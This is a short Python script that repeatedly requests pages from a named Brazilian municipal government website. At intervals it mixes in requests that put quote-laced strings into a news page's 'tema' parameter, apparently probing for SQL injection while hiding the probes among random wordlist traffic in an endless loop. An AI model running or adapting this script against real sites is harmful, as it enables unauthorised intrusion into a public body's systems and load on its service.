import random
import time
import requests

class Main:
    def __init__(self):
        self.stepForEvil = 3
        self.url = 'http://saosebastiao.sp.gov.br'
        self.iterations = 10
        self.urls = self.arrayFromFile('wordlist.txt')
        self.proxys={
            "http": "http://177.69.21.89:8080",
            "https": "https://177.69.21.89:8080",
        }
        self.evilUrls = [
            'http://www.saosebastiao.sp.gov.br/noticia-lista-tema.asp?tema=',

        ]

    def arrayFromFile(self, fileName):
        fileObj = open(fileName, "r") #opens the file in read mode
        words = fileObj.read().splitlines() #puts the file into an array
        fileObj.close()
        return words

    def pickRandomUrl(self):
        return random.choice(self.urls)

    def pickRandomEvilUrl(self):
        randomEvilUrl = self.pickEvilUrl()
        evilSubstring = "'"
        evilArg = self.pickEvilArg()
        url="{}{}".format(randomEvilUrl, evilArg)
        return url

    def pickEvilArg(self):
        keywords = [
            "Governo - SEGOV",
            "Administração - SECAD",
            "Assuntos Jurí'dicos - SAJUR",
            "Saú'de - SESAU",
            "Educação - SEDUC",
            "Fazenda - SEFAZ",
            "Desenvolvimento Econômico e Social - SEDES",
            "Serviços Pú'blicos - SESEP",
            "Meio Ambiente - SEMAM",
            "Esportes - SEESP",
            "Seguranç'a Urbana - SEGUR",
            "Turismo - SETUR",
            "Urbanismo - SEURB",
            "Pessoa com Deficiência e do Idoso - SEPEDI",
            "Habitação e Regularização Fundiá'ria - SEHAB",
            "Planejamento - SEPLAN",
            "Obras - SEO",
            "Fundo Social de São Sebastião",
            "Fundação Educacional e Cultural de São Sebastião Deodato Sant'Anna (FUNDASS)",
            "Fundação de Saú'de Pública de São Sebastião (FSPSS)",
        ]
        
        return random.choice(keywords)

    def pickEvilUrl(self):
        return random.choice(self.evilUrls)

    def init(self):
        while True:
            x = 0
            for x in range(self.iterations):
                if(x == self.stepForEvil):
                    self.request(self.pickRandomEvilUrl())

                self.request(self.pickRandomUrl())
                time.sleep(0.2)

            self.iterations = random.randint(5, 20)

    def request(self, url):
        try:
            req = requests.get(url, timeout = 2)

            print(url)
        except:
            print('OFFLINE')
            time.sleep(30)


main = Main()

main.init()